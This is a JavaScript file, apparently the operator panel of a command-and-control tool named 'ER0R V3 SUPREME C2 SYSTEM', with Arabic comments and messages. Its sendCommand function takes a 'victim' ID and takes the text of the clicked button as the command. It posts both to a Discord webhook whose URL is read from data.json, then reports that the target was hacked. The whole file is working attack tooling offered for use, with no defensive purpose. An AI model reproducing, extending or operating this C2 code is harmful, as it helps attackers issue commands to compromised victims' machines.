/* ER0R V3 SUPREME ENGINE - THELX CONTROL CORE 
   This script handles command routing to Discord Webhooks 
*/

const CONFIG_FILE = './data.json';

// وظيفة إرسال الأوامر الأساسية
async function sendCommand(action) {
    const targetInput = document.getElementById('targetID');
    const consoleBox = document.getElementById('console');
    
    // التأكد من وجود الـ ID
    if (!targetInput || !targetInput.value.trim()) {
        alert("⚠️ خطأ صريح: يجب إدخال ID الضحية أولاً للسيطرة!");
        return;
    }

    const targetID = targetInput.value.trim();
    const timestamp = new Date().toLocaleTimeString();

    // تحديث شاشة الكونسول في اللوحة
    if (consoleBox) {
        consoleBox.innerHTML += `<br><span style="color:#6001d2">[${timestamp}]</span> <span style="color:#fff">جاري إرسال أمر:</span> <b style="color:#0f0">${action}</b> إلى الضحية <b style="color:#6001d2">${targetID}</b>...`;
        consoleBox.scrollTop = consoleBox.scrollHeight;
    }

    try {
        // جلب الإعدادات من ملف data.json
        const response = await fetch(CONFIG_FILE);
        if (!response.ok) throw new Error("فشل تحميل ملف الإعدادات");
        
        const config = await response.json();
        const webhookURL = config.webhook_url;

        // إرسال البيانات إلى ديسكورد عبر الويب هوك
        const payload = {
            embeds: [{
                title: "🕹️ تنفيذ أمر جديد",
                color: 6291922, // لون بنفسجي (6001d2)
                fields: [
                    { name: "👤 الضحية", value: `\`${targetID}\``, inline: true },
                    { name: "📡 الأمر", value: `**${action}**`, inline: true },
                    { name: "⏰ الوقت", value: timestamp, inline: true }
                ],
                footer: { text: "ER0R V3 SUPREME C2 SYSTEM" }
            }]
        };

        const push = await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (push.ok && consoleBox) {
            consoleBox.innerHTML += `<br><span style="color:#0f0">[SUCCESS] تم اختراق الهدف وإرسال الأمر بنجاح.</span>`;
        } else {
            throw new Error("فشل الإرسال");
        }

    } catch (err) {
        console.error("THELX ERROR:", err);
        if (consoleBox) {
            consoleBox.innerHTML += `<br><span style="color:red">[!] فشل في الاتصال بالويب هوك. تأكد من إعدادات data.json</span>`;
        }
    }
}

// تشغيل نظام الاستماع للأزرار فور تحميل الصفحة
document.addEventListener('DOMContentLoaded', () => {
    console.log("THELX V3 ENGINE ONLINE");
    
    // ربط كافة الأزرار التي تحمل كلاس .btn بالوظيفة
    const buttons = document.querySelectorAll('.btn');
    buttons.forEach(btn => {
        btn.onclick = function() {
            // استخراج نص الزر لاستخدامه كأمر
            const cmdText = this.innerText || this.textContent;
            sendCommand(cmdText.trim());
        };
    });

});
